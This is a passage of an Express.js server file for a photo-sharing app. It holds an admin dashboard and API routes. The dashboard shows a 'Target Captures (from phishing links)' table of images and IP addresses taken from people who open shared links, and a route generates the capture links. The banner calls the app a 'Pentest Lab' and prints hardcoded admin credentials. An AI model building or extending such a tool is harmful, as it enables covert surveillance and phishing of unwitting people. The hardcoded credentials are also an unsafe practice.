    </style>
</head>
<body>
    <nav>
        <div class="logo">⚡ Admin<span>Panel</span></div>
        <div class="user-info">
            <span>👤 \${req.session.user.username}</span>
            <a href="/logout">Logout</a>
        </div>
    </nav>
    
    <div class="container">
        <h1>🎯 <span>Admin</span> Dashboard</h1>
        <div class="subtitle">Real-time monitoring & control panel</div>
        
        <div class="stats-grid">
            <div class="stat-card red">
                <div class="num">\${users.length}</div>
                <div class="label">Total Users</div>
            </div>
            <div class="stat-card blue">
                <div class="num">\${photos.length}</div>
                <div class="label">Total Photos</div>
            </div>
            <div class="stat-card green">
                <div class="num">\${targetCaptures.length}</div>
                <div class="label">Target Captures</div>
            </div>
            <div class="stat-card yellow">
                <div class="num">\${photos.reduce((s, p) => s + (p.views || 0), 0)}</div>
                <div class="label">Total Views</div>
            </div>
        </div>
        
        <div class="tab-bar">
            <div class="tab active" onclick="switchTab('users')">👥 Users</div>
            <div class="tab" onclick="switchTab('photos')">📸 Photos</div>
            <div class="tab" onclick="switchTab('captures')">🎯 Captures</div>
            <div class="tab" onclick="switchTab('live')">⚡ Live Feed</div>
        </div>
        
        <div class="panel active" id="panel-users">
            <div class="section">
                <h2>Registered Users</h2>
                <table>
                    <tr>
                        <th>Username</th>
                        <th>Role</th>
                        <th>Created</th>
                        <th>Photos</th>
                        <th>Status</th>
                    </tr>
                    \${users.map(u => \`
                    <tr>
                        <td>\${u.isAdmin ? '🛡️ ' : '👤 '}\${u.username}</td>
                        <td><span class="badge \${u.isAdmin ? 'admin' : 'user'}">\${u.isAdmin ? 'Admin' : 'User'}</span></td>
                        <td>\${new Date(u.createdAt).toLocaleString()}</td>
                        <td>\${photos.filter(p => p.ownerId === u.id).length}</td>
                        <td style="color:#2ed573;">● Active</td>
                    </tr>
                    \`).join('')}
                </table>
            </div>
        </div>
        
        <div class="panel" id="panel-photos">
            <div class="section">
                <h2>All Photos</h2>
                <table>
                    <tr>
                        <th>Photo</th>
                        <th>Owner</th>
                        <th>Views</th>
                        <th>Captures</th>
                        <th>Created</th>
                        <th>Link</th>
                    </tr>
                    \${photos.map(p => \`
                    <tr>
                        <td><img src="/uploads/\${p.fileName}" class="thumb"></td>
                        <td>\${p.ownerUsername}</td>
                        <td>\${p.views || 0}</td>
                        <td>\${p.targetCaptures || 0}</td>
                        <td>\${new Date(p.createdAt).toLocaleString()}</td>
                        <td><a href="/view/\${p.shareId}" target="_blank" class="view-link">🔗 View</a></td>
                    </tr>
                    \`).join('')}
                </table>
            </div>
        </div>
        
        <div class="panel" id="panel-captures">
            <div class="section">
                <h2>Target Captures (from phishing links)</h2>
                <table>
                    <tr>
                        <th>Image</th>
                        <th>Linked To</th>
                        <th>IP</th>
                        <th>Captured At</th>
                    </tr>
                    \${targetCaptures.slice().reverse().map(c => \`
                    <tr>
                        <td><img src="/uploads/\${c.fileName}" class="thumb"></td>
                        <td>\${c.originalShareId}</td>
                        <td>\${c.ip || 'Unknown'}</td>
                        <td>\${new Date(c.capturedAt).toLocaleString()}</td>
                    </tr>
                    \`).join('')}
                    \${targetCaptures.length === 0 ? '<tr><td colspan="4" style="text-align:center;color:#666;">No captures yet</td></tr>' : ''}
                </table>
            </div>
        </div>
        
        <div class="panel" id="panel-live">
            <div class="section">
                <div class="live-feed">
                    <div class="title">⚡ Real-time Activity Log</div>
                    <div id="liveEntries">
                        <div class="live-entry">
                            <span class="time">[System]</span>
                            <span class="event">Server started. Monitoring enabled.</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        function switchTab(name) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.querySelector('.tab[onclick*="' + name + '"]').classList.add('active');
            document.getElementById('panel-' + name).classList.add('active');
        }
        
        // Simulate live feed (in production, use WebSocket)
        setInterval(() => {
            fetch('/api/admin/live')
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('liveEntries');
                    if (data.events && data.events.length) {
                        container.innerHTML = data.events.slice(0, 20).map(e => \`
                            <div class="live-entry">
                                <span class="time">[\${e.time}]</span>
                                <span class="event">\${e.event}</span>
                            </div>
                        \`).join('');
                    }
                })
                .catch(() => {});
        }, 5000);
    </script>
</body>
</html>
    \`);
});

// ---- ADMIN LIVE FEED API ----
app.get('/api/admin/live', (req, res) => {
    const events = [
        { time: new Date().toLocaleTimeString(), event: '🟢 System monitoring active' }
    ];
    
    // Read current stats
    const users = readJSON('users.json');
    const photos = readJSON('photos.json');
    
    events.push({ 
        time: new Date().toLocaleTimeString(), 
        event: \`👥 Users: \${users.length} | Photos: \${photos.length}\` 
    });
    
    res.json({ events });
});

// ---- CREATE TARGET LINK FROM DASHBOARD ----
app.post('/api/create-target', requireAuth, (req, res) => {
    const { shareId } = req.body;
    if (!shareId) return res.json({ success: false, error: 'No shareId provided' });
    
    const photos = readJSON('photos.json');
    const photo = photos.find(p => p.shareId === shareId && p.ownerId === req.session.user.id);
    
    if (!photo) return res.json({ success: false, error: 'Photo not found or not yours' });
    
    const targetUrl = \`\${req.protocol}://\${req.get('host')}/capture/\${shareId}\`;
    
    res.json({ success: true, targetUrl });
});

// ============ START SERVER ============
app.listen(PORT, '0.0.0.0', () => {
    console.log('==========================================');
    console.log('  📸 SecureVault - Pentest Lab');
    console.log('  🔗 http://localhost:' + PORT);
    console.log('  👤 Admin: hello Hacker\'s');
    console.log('  🔑 Pass: mcmcmcmc@#@#@#@#');
    console.log('==========================================');
});
